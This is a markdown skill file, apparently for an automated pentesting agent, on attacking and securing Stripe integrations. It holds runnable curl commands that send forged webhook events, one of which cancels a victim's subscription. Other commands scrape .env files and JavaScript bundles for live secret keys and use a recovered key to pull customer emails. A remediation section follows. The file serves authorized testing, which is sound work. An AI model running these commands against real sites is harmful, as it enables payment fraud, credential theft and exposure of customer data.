---
name: stripe
description: Stripe integration — webhook signature verification, restricted-key scopes, Idempotency-Key abuse, Connect account permissions
triggers: [stripe, stripe-node, stripe-python, stripe webhooks, restricted api key, stripe connect, customer.created, payment_intent]
---

# Stripe Security

Stripe powers most modern SaaS billing. Bugs cluster around **webhook signature verification** (skipped or misconfigured), **restricted API key scopes** (admin key used for read-only reasons), **race conditions** in payment flows (double-charges, premature fulfillment), **Idempotency-Key** abuse, and **Stripe Connect** OAuth misconfig.

## Attack Surface

### Webhook signatures
- Stripe POSTs webhook events to your endpoint with `Stripe-Signature` header
- Format: `t=<timestamp>,v1=<signature>`
- Bug: server reads JSON body without verifying signature → attacker spoofs events
- Common spoof scenarios: `payment_intent.succeeded` for an unpaid invoice; `charge.refunded` to reverse legitimate fraud

### API key scopes
- `sk_live_*` — secret key, full account access
- `rk_live_*` — restricted key with specific permissions (per-resource read/write)
- `pk_live_*` — publishable key, client-safe
- Bug: `sk_live_*` used in client-side code → instant tenant compromise
- Bug: restricted key with `read_write` on `customers` → can update customer payment methods

### Idempotency-Key
- Stripe's idempotency: same Idempotency-Key + same operation = single result
- Bug: developer reuses Idempotency-Key across users (e.g., same key for everyone's first charge) → returns the first request's response for all subsequent users
- Bug: no Idempotency-Key on retry path → double-charge

### Stripe Connect
- Platform model for marketplaces
- OAuth flow to connect connected accounts
- Bug: `state` parameter missing → CSRF on connect callback → attacker links own Stripe account to victim's platform tenant
- Bug: `redirect_uri` loose-match → token leak

### Customer Portal
- `billing_portal` for self-service subscription management
- Bug: customer portal sessions accept any `return_url` → open redirect

### Payment Intents + Setup Intents
- `payment_intent.succeeded` ≠ payment fulfilled — app must call its own fulfillment logic
- Bug: fulfillment based on client-side `redirect` rather than server-side webhook → spoof-able

### Customer impersonation
- Stripe API operations identified by `customer_id`
- Bug: app accepts user-supplied `customer_id` in API calls without ownership check → cross-customer payment-method update / charge

## Detection Channels

### Fingerprint Stripe integration
```bash
# Stripe.js in page source
curl -s 'https://<TARGET>/' | grep -oE 'js\.stripe\.com|@stripe/stripe-js'

# Publishable key exposed (always; it's meant to be)
curl -s 'https://<TARGET>/' | grep -oE 'pk_(live|test)_[A-Za-z0-9_-]{40,}'

# Webhook endpoint discovery
curl -s 'https://<TARGET>/api/webhooks/stripe' -i  # 405 / 400 if it exists
```

### Secret-key exposure
```bash
# Look for sk_live in places it shouldn't be
curl -s 'https://<TARGET>/.env'
curl -s 'https://<TARGET>/static/main.js' | grep -oE 'sk_(live|test)_[A-Za-z0-9_-]+'

# In repo
grep -rE 'sk_live_[A-Za-z0-9_-]{20,}' .
```

`sk_live_*` is **the worst possible leak** — tenant admin equivalent.

### Webhook signature absence
```bash
# Send a fake Stripe-shaped event
curl -X POST 'https://<TARGET>/api/webhooks/stripe' \
  -H 'Content-Type: application/json' \
  -H 'Stripe-Signature: t=$(date +%s),v1=fake' \
  -d '{
    "id": "evt_test_strix",
    "type": "payment_intent.succeeded",
    "data": {"object": {"id": "pi_test_strix", "amount": 0, "metadata": {"order_id": "order_strix"}}}
  }'
```

If response is 200 / fulfillment effects visible → signature not verified.

## Operational Runbook

### Step 1 — fingerprint + identify webhook endpoint
```bash
# Common webhook paths
for path in /api/webhooks/stripe /api/stripe/webhook /webhook/stripe /stripe-webhook; do
  curl -s -o /dev/null -w "${path}: %{http_code}\n" -X POST "https://<TARGET>${path}" -d '{}'
done

# 400 = endpoint exists but rejected payload; 405 = method-only mismatch
```

### Step 2 — webhook signature bypass
```bash
# Without correct signing key, signatures fail
# Test what server does with wrong sig:
curl -X POST 'https://<TARGET>/api/webhooks/stripe' \
  -H 'Content-Type: application/json' \
  -H 'Stripe-Signature: t=1700000000,v1=invalid' \
  -d '{"type":"customer.subscription.deleted","data":{"object":{"customer":"cus_victim"}}}'

# If 200 (vs 400 signature-invalid) → signature not verified
# If side-effect (subscription appears cancelled) → exploitable
```

### Step 3 — secret-key exposure
```bash
# Search wide
for path in /.env /.env.local /config.json /.next/server/middleware.js /static/js/main.js; do
  curl -s "https://<TARGET>${path}" | grep -oE 'sk_(live|test)_[A-Za-z0-9_-]+'
done
```

If `sk_live_*` recovered, validate access:
```bash
curl -s -u "${SK_LIVE}:" 'https://api.stripe.com/v1/customers?limit=3' | jq '.data[].email'
# Returns customer emails → tenant compromise confirmed
```

### Step 4 — restricted-key audit (when source is available)
```bash
# Find restricted-key usage; check the scope grants
grep -rE 'rk_(live|test)_[A-Za-z0-9_-]+' .

# rk_* keys are scoped; the dashboard shows permissions
# Bug: read_write on a resource that should be read-only
```

### Step 5 — Idempotency-Key reuse
```bash
# Find Idempotency-Key construction
grep -rE 'Idempotency-Key|idempotencyKey' .

# Bug: same key for all users (`'charge-key'` constant)
# Bug: derived from user-controlled input (allows collision)
```

### Step 6 — Connect OAuth misconfig
```bash
# Stripe Connect OAuth URL pattern
# https://connect.stripe.com/oauth/authorize?response_type=code&client_id=...&scope=...&state=...

# Find the connect handler
grep -rE 'connect\.stripe\.com|stripe\.oauth\.token' .

# Bug: state not generated / validated → CSRF on connect callback
```

### Step 7 — customer_id ownership audit
```bash
# Find endpoints that take customer_id from request
grep -rE 'customer_id|customerId.*req\.body|req\.query\.customer' .

# Bug: API accepts customer_id, performs Stripe API call without ownership check
# Attacker passes another user's customer_id → reads/writes their payment methods
```

## Specific Vulnerability Classes

### Race condition on payment confirmation
- App polls Stripe for `payment_intent.status === 'succeeded'`
- Bug: between confirm + fulfill, attacker cancels via parallel API call → fulfillment lands but charge is reversed
- Detection: see race_conditions.md skill — fire N parallel "confirm" requests

### `paymentmethod.attach` cross-customer
- API: `paymentMethod.attach(pm_id, {customer: customer_id})`
- Bug: attacker has pm_id from a public Stripe Element, attaches to victim's customer
- Subsequent charges debit attacker's card; or refunds go to attacker

### `payment_intent.metadata` trust
- App reads `payment_intent.metadata.order_id` after `payment_intent.succeeded`
- Bug: metadata is user-supplied client-side → attacker sets metadata to victim's order_id
- Server fulfills victim's order using attacker's payment intent (or fails because validation lags)

### Webhook event replay
- Even with signature verified, an old event can be re-sent
- Bug: no event-id deduplication → same event processed twice → double fulfillment

### Stripe Tax misconfiguration
- Tax IDs from customer are trusted
- Bug: customer self-reports VAT ID, app applies tax exemption without validation

## Bypass Techniques

- **Timestamp tolerance**: Stripe's signature includes timestamp; default tolerance is 5 minutes. Defenders sometimes set higher → replay window
- **Signature scheme `v1` only**: Stripe deprecated `v0`; old verifiers may accept both
- **JSON-encoding ambiguity**: signature is over the *raw body bytes*; if your server re-serialises before verifying, signatures fail. Bug: developer parses then re-stringifies → verification breaks; some "fix" by skipping verification

## Validation

1. Webhook spoof: 200 response on unsigned event with side-effect.
2. `sk_live_*` recovered + validated via Stripe API call.
3. Restricted key with over-broad scope confirmed via permission probe.
4. Idempotency reuse: deterministic key extracted from source.
5. Connect CSRF: link attacker's Stripe account to victim's platform.

## False Positives

- Webhook endpoint behind WAF / IP allow-list (Stripe's IPs) — confirm WAF actually filters before flagging.
- Test-mode keys (`sk_test_*`) in production — flag but lower severity.
- Customer portal with intentional return_url flexibility (some apps need this for embedded flows).

## Impact

- **Tenant admin via sk_live_* leak** — read all customers, all charges, all refunds.
- **Spoofed-event fulfillment** — provision premium features without payment.
- **Double-charge / refund-bypass** via race conditions.
- **Customer impersonation** — charge / refund another user's card.
- **Platform takeover** via Connect CSRF.

## Remediation

1. **Always verify webhook signatures** using Stripe's official SDK (`stripe.webhooks.constructEvent(rawBody, sig, secret)`).
2. **`sk_live_*` from env-var**, scoped IAM in cloud secret stores.
3. **Restricted keys for everything except admin operations**.
4. **Idempotency-Keys derived from user + operation + timestamp**, never constant.
5. **Stripe Connect `state` parameter** generated server-side, single-use, session-bound.
6. **Event-id deduplication** at the webhook handler.
7. **Customer ownership check** on every endpoint that accepts customer_id from request.

## Pro Tips

1. The single most-common Stripe finding: webhook signature verification skipped. Always probe with a malformed signature first.
2. `sk_live_*` keys in commit history are persistently leaked — even if rotated, the leak is forever (search `git log` + GitHub code search).
3. `pk_live_*` is meant to be public; not a finding when exposed.
4. Stripe's "Restricted API Keys" feature is under-used; most apps use `sk_live_*` for everything because tutorials show that pattern.
5. The webhook signing secret rotates on dashboard request — but the OLD secret stays valid until the deadline; sometimes developers configure only the new one and lose events.

## Summary

Stripe security is webhook signature verification + secret-key isolation + idempotency + Connect state. The financial impact bias makes every Stripe bug critical — confirmed signature-skip on a fulfillment webhook = direct revenue loss.
